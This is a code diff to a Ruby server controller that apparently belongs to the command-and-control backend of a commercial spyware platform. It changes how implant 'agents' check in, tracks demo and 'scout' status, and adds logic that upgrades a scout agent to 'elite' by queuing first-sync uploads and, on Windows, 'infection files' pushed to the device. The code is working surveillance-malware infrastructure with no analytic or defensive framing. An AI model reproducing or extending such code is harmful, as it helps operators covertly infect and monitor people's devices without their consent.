@@ -274,10 +274,10 @@ class AgentController < RESTController
   def status
     require_auth_level :server, :tech
     
-    # parse the platform to check if the agent is in demo mode ( -DEMO appended )
-    demo = @params['subtype'].end_with? '-DEMO'
-    platform = @params['subtype'].gsub(/-DEMO/, '').downcase
-    
+    demo = @params['demo']
+    scout = @params['scout']
+    platform = @params['platform'].downcase
+
     # retro compatibility for older agents (pre 8.0) sending win32, win64, ios, osx
     case platform
       when 'win32', 'win64'
@@ -289,7 +289,7 @@ class AgentController < RESTController
       when 'macos'
         platform = 'osx'
     end
-    
+
     # is the agent already in the database? (has it synchronized at least one time?)
     agent = Item.where({_kind: 'agent', ident: @params['ident'], instance: @params['instance'].downcase, platform: platform, demo: demo}).first
 
@@ -301,6 +301,18 @@ class AgentController < RESTController
       # a demo agent will never be queued
       if agent[:status] == 'queued' and LicenseManager.instance.burn_one_license(agent.type.to_sym, agent.platform.to_sym)
         agent.status = 'open'
+        agent.save
+      end
+
+      # the agent was a scout but now is upgraded to elite
+      if agent.scout and not scout
+        # add the upload files for the first sync
+        agent.add_first_time_uploads
+
+        # add the files needed for the infection module
+        agent.add_infection_files if agent.platform == 'windows'
+
+        agent.scout = false
         agent.save
       end
 
@@ -327,6 +339,7 @@ class AgentController < RESTController
     agent.platform = platform
     agent.instance = @params['instance'].downcase
     agent.demo = demo
+    agent.scout = scout
 
     # default is queued
     agent.status = 'queued'
@@ -342,11 +355,14 @@ class AgentController < RESTController
     # save the new instance in the db
     agent.save
 
-    # add the upload files for the first sync
-    agent.add_first_time_uploads
+    # the scout must not receive the first uploads
+    unless scout
+      # add the upload files for the first sync
+      agent.add_first_time_uploads
 
-    # add the files needed for the infection module
-    agent.add_infection_files if agent.platform == 'windows'
+      # add the files needed for the infection module
+      agent.add_infection_files if agent.platform == 'windows'
+    end
 
     # add the new agent to all the accessible list of all users
     SessionManager.instance.add_accessible_agent(factory, agent)
